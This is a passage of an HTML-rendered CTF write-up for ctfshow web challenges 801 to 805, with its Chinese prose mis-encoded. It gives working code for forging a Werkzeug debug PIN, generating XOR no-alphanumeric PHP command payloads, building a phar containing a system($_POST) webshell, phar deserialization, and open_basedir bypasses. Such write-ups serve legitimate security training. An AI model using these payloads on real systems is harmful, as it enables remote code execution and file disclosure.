private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485377581187'</span><span class="token punctuation">,</span><span class="token comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span>
    <span class="token comment">#machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>
    <span class="token string">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span><span class="token comment">#  /proc/self/cgroup</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span><span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨æœ€ç»ˆç”Ÿæˆçš„PINè¿›å…¥ä»£ç è°ƒè¯•ï¼ŒRCE</p>
<p><strong>802</strong></p>

        <h3 id="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"   >
          <a href="#æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"></a>æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ</h3>
      <p>å¼‚æˆ–æ³•ï¼Œå·ä¸ªè„šæœ¬å–µå–µ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*author yu22x*/</span>

<span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xor_rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[a-z0-9]/i'</span><span class="token punctuation">;</span> <span class="token comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>
            <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>
            <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token comment"># author yu22x</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib
<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
   s1<span class="token operator">=</span><span class="token string">""</span>
   s2<span class="token operator">=</span><span class="token string">""</span>
   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>
       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"xor_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>
       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>
               <span class="token keyword">break</span>
           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>
               <span class="token comment">#print(i)</span>
               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
               <span class="token keyword">break</span>
       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"^\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>
   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
   
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your functionï¼š"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your commandï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>
   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>803</strong></p>

        <h3 id="pharæ–‡ä»¶åŒ…å«"   >
          <a href="#pharæ–‡ä»¶åŒ…å«" class="heading-link"><i class="fas fa-link"></i></a><a href="#pharæ–‡ä»¶åŒ…å«" class="headerlink" title="pharæ–‡ä»¶åŒ…å«"></a>pharæ–‡ä»¶åŒ…å«</h3>
      <p>æ¥è‡ªå¤§ä½¬çš„æç¤ºï¼šæŠŠpharå½“å‹ç¼©åŒ…ç”¨å°±è¡Œ</p>
<p>é¦–å…ˆç”ŸæˆåŒ…å«ä¸€å¥è¯æœ¨é©¬çš„pharæ–‡ä»¶</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php system($_POST[a]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// pharç”Ÿæˆ</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤æ—¶pharåŒ…ä¸­çš„test.txtä¸­çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬äº†</p>
<p>ä¸Šä¼ æ–‡ä»¶ï¼ˆè®°å¾—è¯»å–ç„¶åurlç¼–ç ä¸€ä¸‹ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;&#x2F;tmp&#x2F;phar.phar&amp;content&#x3D;%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>includeå¹²</p>
<p>![æˆªå±2022-06-06 20.00.48](/Users/jlan/Library/Application Support/typora-user-images/æˆªå±2022-06-06 20.00.48.png)</p>
<p><strong>804</strong></p>

        <h3 id="pharååºåˆ—åŒ–"   >
          <a href="#pharååºåˆ—åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3>
      <p>è¿™ä¸ç”¨æ•™å§</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">hacker</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// @unlink("phar.phar");</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span>
<span class="token comment">// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //å‹ç¼©è§„é¿æ•æ„Ÿå­—ç¬¦</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span>
<span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$o</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">=</span><span class="token string double-quoted-string">"highlight_file('flag.php');"</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>
<span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// pharç”Ÿæˆ</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šä¼ pharåè®®è¯»å–å°±è¡Œ</p>
<p><strong>805</strong></p>

        <h3 id="open-basedirç»•è¿‡"   >
          <a href="#open-basedirç»•è¿‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#open-basedirç»•è¿‡" class="headerlink" title="open_basedirç»•è¿‡"></a>open_basedirç»•è¿‡</h3>
      <blockquote>
<p>open_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚</p>
<p>å‡è®¾open_basedir=/var/www/html/web1/:/tmp/ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/var/www/html/web1/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚</p>
<p>æ³¨æ„ï¼šç”¨open_basediræŒ‡å®šçš„<strong>é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•å</strong>ã€‚</p>
<p>æ–‡ç« æ¥è‡ª<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/hookjoy/p/12846164.html" >è¿™é‡Œ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<p>ä½†æ˜¯è¿™ä¸ªé…ç½®å¯¹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œæ¯”å¦‚æ‰§è¡Œ<code>system(&#39;ls /&#39;)</code>çš„æ—¶å€™å°±ä¸å—é™åˆ¶ï¼Œ<del>ä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šè¢«banæ‰</del></p>
<p>ä¸‹é¢å°±æ˜¯ä¸€äº›bypassæ–¹æ³•</p>
<ol>
<li><p>globåè®®ï¼Œåªèƒ½æææ–‡ä»¶å</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass</p>
<p>åŸç†åœ¨è¿™é‡Œ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ctfshowflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>åˆ©ç”¨bindtextdomain()å‡½æ•°Bypass</p>
<p>è¿™ä¸ªæ–¹æ³•ä¹Ÿåªèƒ½æææ–‡ä»¶å</p>
<blockquote>
<p><strong>bindtextdomain()å‡½æ•°</strong></p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>bindtextdomain()å‡½æ•°ç”¨äºç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">bindtextdomain</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$domain</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$directory</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>bindtextdomain()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°$directoryæ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå®ƒä¼šåœ¨$directoryå­˜åœ¨çš„æ—¶å€™è¿”å›$directoryï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚</p>
</blockquote>
<p>æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹directoryå‚æ•°æ ¹æ®è¿”å›å€¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p>
</li>
<li><p>åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•Bypass</p>
<p>è¿™ä¸ªå’Œä¸Šé¢é‚£ä¸ªå¾ˆç›¸ä¼¼ï¼Œä¹Ÿæ˜¯åŸºäºæŠ¥é”™ï¼Œç›´æ¥ç»™payloadå§</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;b>open_basedir: '</span> <span class="token operator">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/b>&lt;br />'</span><span class="token punctuation">;</span>
<span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileInfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token operator">-></span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>åˆ©ç”¨realpath()å‡½æ•°Bypass</p>
<blockquote>

        <h3 id="realpath-å‡½æ•°"   >
          <a href="#realpath-å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#realpath-å‡½æ•°" class="headerlink" title="realpath()å‡½æ•°"></a>realpath()å‡½æ•°</h3>
      <p>(PHP 4, PHP 5, PHP 7)</p>
